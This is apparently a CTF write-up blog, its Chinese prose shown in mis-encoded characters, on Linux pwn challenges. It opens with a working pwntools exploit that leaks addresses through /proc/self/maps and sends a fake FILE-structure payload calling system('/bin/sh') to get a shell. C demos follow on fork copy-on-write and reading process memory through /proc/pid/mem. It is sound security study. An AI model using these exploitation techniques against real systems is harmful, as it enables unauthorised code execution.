<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;10.7.2.142&quot;</span>,<span class="number">9898</span>)</span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Your guess:&quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gitf</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;FileName: &quot;</span>)</span><br><span class="line">    sh.sendline(filepath)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    guess()</span><br><span class="line">    gitf(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Open successful\n&quot;</span>)</span><br><span class="line">    elf_addr=<span class="built_in">int</span>((sh.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">    libc_addr=<span class="built_in">int</span>((sh.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">    fake_file=elf_addr+<span class="number">0x4300</span>+<span class="number">0x10</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x4300</span>-<span class="number">0x42E0</span>)</span><br><span class="line">    pay+=p64(fake_file)+p64(<span class="number">0</span>)</span><br><span class="line">    pay+=<span class="string">&#x27;\xff\xff\xdf\xff;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=p64(fake_file+<span class="number">0xe0</span>)</span><br><span class="line">    pay+=p64(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">21</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;We will give you a million bonus cheque.\nLeave your name:&quot;</span>)</span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-Mute-amp-Blind"><a href="#0x4-Mute-amp-Blind" class="headerlink" title="0x4 Mute&amp;Blind"></a>0x4 Mute&amp;Blind</h2><h4 id="0x4-1-çˆ¶å­è¿›ç¨‹çš„å…³ç³»"><a href="#0x4-1-çˆ¶å­è¿›ç¨‹çš„å…³ç³»" class="headerlink" title="0x4.1 çˆ¶å­è¿›ç¨‹çš„å…³ç³»"></a>0x4.1 çˆ¶å­è¿›ç¨‹çš„å…³ç³»</h4><p>æ¶‰åŠåˆ°äº†çˆ¶å­è¿›ç¨‹çš„é—®é¢˜ï¼Œä»¥å‰åªæ˜¯ç²—ç•¥çš„å­¦ä¹ äº†ä¸€ä¸‹ï¼ŒçŸ¥é“è¯¥æ€ä¹ˆä½¿ç”¨ï¼Œè¿™æ¬¡é€šè¿‡è¿™é“é¢˜å¯¹çˆ¶å­è¿›ç¨‹æœ‰äº†æ›´æ·±åˆ»çš„ç†è§£</p>
<p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œè¿™ä¸ªåœ°å€ç©ºé—´æ˜¯è™šæ‹Ÿçš„ï¼Œæ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å’Œè¿™ä¸ªè¿›ç¨‹çœŸæ­£åŠ è½½åˆ°å†…å­˜çš„ç‰©ç†åœ°å€å­˜åœ¨ç€æ˜ å°„å…³ç³»ï¼Œå½“è¿™ä¸ªè¿›ç¨‹æ‰§è¡ŒæŸä¸€æ¡æŒ‡ä»¤æ—¶å…ˆæŠŠè¿™ä¸ªæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€å‘é€åˆ°MMU(CPUçš„åœ°å€è½¬æ¢å•å…ƒ)ï¼Œè½¬åŒ–æˆè¿™ä¸ªæŒ‡ä»¤çš„çœŸå®ç‰©ç†åœ°å€ç„¶åæ‰¾åˆ°è¿™ä¸ªæŒ‡ä»¤å†è¿›è¡Œæ‰§è¡Œã€‚</p>
<p>å½“çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæŠŠçˆ¶è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¤åˆ¶ä¸€ä»½å†ç»™å­è¿›ç¨‹ï¼Œå¹¶ä¸”çˆ¶å­è¿›ç¨‹çš„ç›¸å¯¹äºç‰©ç†å†…å­˜çš„æ˜ å°„å…³ç³»æ˜¯ä¸€æ ·çš„ï¼Œæ³¨æ„æ˜¯æŠŠç‹¬ç«‹çš„ä¸€ä»½è™šæ‹Ÿåœ°å€ç©ºé—´ç»™äº†å­è¿›ç¨‹ï¼Œè€Œä¸æ˜¯çˆ¶å­è¿›ç¨‹å…±äº«åœ°å€ç©ºé—´ã€‚é€šè¿‡ä¸‹é¢çš„ä»£ç å¯ä»¥è¯æ˜ä»–ä»¬çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ ·ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,&amp;buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child is created\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,&amp;buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father:my child is pid %d\n&quot;</span>,pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;susssess\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">sprintf</span>(buff,<span class="string">&quot;/proc/%d/maps&quot;</span>,getpid());</span><br><span class="line">        <span class="keyword">int</span> fd=open(buff,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        read(fd,buf,<span class="number">900</span>);</span><br><span class="line">        write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child is created\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        read(fd,buf,<span class="number">900</span>);</span><br><span class="line">        write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father pid=%d\n&quot;</span>,getpid());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father:my child is pid %d\n&quot;</span>,pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;susssess\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£æ˜ å°„å…³ç³»ä¸€æ ·åˆæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå…¶å®å°±æ˜¯æŒ‡ä»–ä»¬æ˜ å°„åˆ°çš„ç‰©ç†å†…å­˜å†…å­˜æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚çˆ¶è¿›ç¨‹çš„ä»£ç æ®µçš„ç‰©ç†åœ°å€æ˜¯1ï¼Œé‚£å­è¿›ç¨‹çš„ä»£ç æ®µçš„ç‰©ç†åœ°å€ä¹Ÿæ˜¯1ï¼Œå› ä¸ºåˆšå¼€å§‹çš„æ˜ å°„å…³ç³»æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>çˆ¶å­è¿›ç¨‹çš„æ•°æ®éµå¾ªå†™æ—¶å¤åˆ¶ï¼Œè¯»æ—¶å…±äº«çš„åŸåˆ™ï¼Œä¹Ÿå°±æ˜¯è¯»çš„æ—¶å€™ä»–ä»¬çš„æ˜ å°„å…³ç³»è¿˜æ˜¯ä¸å˜çš„ï¼Œä½†å†™çš„æ—¶å€™å°±ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå…·ä½“å˜åŒ–å¦‚ä¸‹</p>
<p>å†™ä¹‹å‰</p>
<p><img src="https://img-blog.csdn.net/20150724140942057" alt="img"></p>
<p>å†™å®Œå</p>
<p><img src="https://img-blog.csdn.net/20150724141000136" alt="img"></p>
<p>ä½†æ˜¯è¯»æ—¶å…±äº«ï¼Œå†™æ—¶å¤åˆ¶å¹¶ä¸é€‚ç”¨äºä»£ç æ®µï¼Œé¦–å…ˆå¯ä»¥ç¡®å®šçˆ¶å­è¿›ç¨‹çš„ä»£ç æ®µæ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ä»£ç æ®µæ˜¯æ²¡å¿…è¦å¤åˆ¶çš„ï¼Œå› æ­¤å†…æ ¸å°†ä»£ç æ®µæ ‡è®°ä¸ºåªè¯»ï¼Œè¿™æ ·çˆ¶å­è¿›ç¨‹å°±å¯ä»¥å®‰å…¨çš„å…±äº«æ­¤ä»£ç æ®µäº†ã€‚forkä¹‹ååœ¨è¿›ç¨‹åˆ›å»ºä»£ç æ®µæ—¶ï¼Œæ–°å­è¿›ç¨‹çš„è¿›ç¨‹çº§é¡µè¡¨é¡¹éƒ½æŒ‡å‘å’Œçˆ¶è¿›ç¨‹ç›¸åŒçš„ç‰©ç†é¡µå¸§ï¼Œæ‰€ä»¥å¦‚æœæ”¹å˜ä»£ç æ®µçš„å†…å®¹ä¼šç ´ååŸå…ˆçš„æ˜ å°„å…³ç³»ã€‚</p>
<p>è¿™æ˜¯æˆ‘å†™çš„ä¸€ä¸ªå°demoã€‚æˆ‘åœ¨çˆ¶è¿›ç¨‹ä¿®æ”¹äº†å­è¿›ç¨‹çš„ä»£ç æ®µï¼Œç„¶åè°ƒè¯•å­è¿›ç¨‹ï¼Œå‘ç°å­è¿›ç¨‹çš„ä»£ç å¹¶æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œå¯è§çˆ¶å­è¿›ç¨‹çš„ä»£ç æ®µåº”è¯¥ä¹Ÿæ˜¯å†™æ—¶å¤åˆ¶ï¼Œè¯»æ—¶å…±äº«ï¼Œæ‰€ä»¥è¿™é“é¢˜å°±æ²¡åŠæ³•é€šè¿‡çˆ¶è¿›ç¨‹ä¿®æ”¹å­è¿›ç¨‹çš„ä»£ç æ®µæ¥æ§åˆ¶å­è¿›ç¨‹äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd,buf,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buf,<span class="number">900</span>);</span><br><span class="line">	<span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;addr);</span><br><span class="line">	mprotect((<span class="keyword">void</span> *)addr,<span class="number">0x1000</span>,<span class="number">7</span>);</span><br><span class="line">	<span class="keyword">int</span> pid=fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,strerror(errno));</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">		sleep(<span class="number">10</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;chlid\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;father and child is not shared&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">size_t</span> child_text_addr=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;input child_text_addr\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;child_text_addr);</span><br><span class="line">		<span class="built_in">sprintf</span>((<span class="keyword">void</span> *)child_text_addr,<span class="string">&quot;asdasdasdasdsad&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="0x4-2-proc-pid-selfä¼ªæ–‡ä»¶åˆ©ç”¨"><a href="#0x4-2-proc-pid-selfä¼ªæ–‡ä»¶åˆ©ç”¨" class="headerlink" title="0x4.2 /proc/pid/selfä¼ªæ–‡ä»¶åˆ©ç”¨"></a>0x4.2 /proc/pid/selfä¼ªæ–‡ä»¶åˆ©ç”¨</h4><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯<code>/proc/pid/mem</code>ä¼ªæ–‡ä»¶ï¼Œç½‘ä¸Šæ²¡æœ‰æ‰¾è§è¿™ä¸ªä¼ªæ–‡ä»¶çš„å…·ä½“å®šä¹‰ï¼ŒæŒ‰æˆ‘çš„ç†è§£å°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„ä¼ªæ–‡ä»¶ï¼Œæ‰“å¼€çš„è¿™ä¸ªæ–‡ä»¶å°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªä¼ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œä¹Ÿå°±æ˜¯å¯¹è¿™ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚<code>read</code>æ“ä½œå’Œ<code>write</code>æ“ä½œï¼Œä½†æ˜¯æ³¨æ„çš„æ˜¯readå’Œwirteæ“ä½œçš„è™šæ‹Ÿåœ°å€å¿…é¡»æ˜¯æ˜ å°„åˆ°å†…å­˜ä¸­çš„ï¼Œä¸ç„¶ä¼šå‘ç”Ÿioé”™è¯¯ï¼ŒåŸå› ä¹Ÿå¾ˆå¥½æƒ³ï¼Œæ²¡æœ‰çœŸå®å†…å­˜æ˜ å°„ä½ æ€ä¹ˆè¯»æ€ä¹ˆå†™ï¼Œè¿™æ˜¯æˆ‘å†™çš„ä¸€ä¸ªå°demoæ¥å®Œæˆå½“å‰è¿›ç¨‹çš„è¯»å–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf,<span class="string">&quot;/proc/%d/mem&quot;</span>,getpid());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	<span class="keyword">int</span> fd=open(buf,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd1=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buff1[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd1,buff1,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff1,<span class="number">900</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> offset=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;offset);</span><br><span class="line">	lseek(fd,offset,<span class="number">1</span>);</span><br><span class="line">	read(fd,buff,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff,<span class="number">900</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»å–ä»£ç æ®µçš„æ•ˆæœï¼Œæ­¤ç¨‹åºä»£ç æ®µç›¸å¯¹äºç¨‹åºé¦–åœ°å€åç§»0x850</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tscrf/pwn5$ ./pwnc</span><br><span class="line">/proc/5819/mem</span><br><span class="line">3</span><br><span class="line">561fcc31a000-561fcc31b000 r-xp 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcc51a000-561fcc51b000 r--p 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcc51b000-561fcc51c000 rw-p 00001000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcd474000-561fcd495000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fc4ceee2000-7fc4cf0c9000 r-xp 00000000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf0c9000-7fc4cf2c9000 ---p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2c9000-7fc4cf2cd000 r--p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2cd000-7fc4cf2cf000 rw-p 001eb000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2cf000-7fc4cf2d3000 rw-p 00000000 00:</span><br><span class="line">94694569781328</span><br><span class="line">]ï¿½ï¿½f.ï¿½]ï¿½@f.ï¿½Hï¿½=I Hï¿½5B UH)ï¿½Hï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½?Hï¿½Hï¿½ï¿½tHï¿½ Hï¿½ï¿½t</span><br><span class="line">                                                           ]ï¿½ï¿½fï¿½]ï¿½@f.ï¿½ï¿½=ï¿½ u/Hï¿½=ï¿½ UHï¿½ï¿½t</span><br><span class="line">ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ ]ï¿½ï¿½ï¿½ï¿½fDUHï¿½ï¿½]ï¿½fï¿½ï¿½ï¿½UHï¿½ï¿½Hï¿½ï¿½dHï¿½%(Hï¿½Eï¿½1ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">                                                            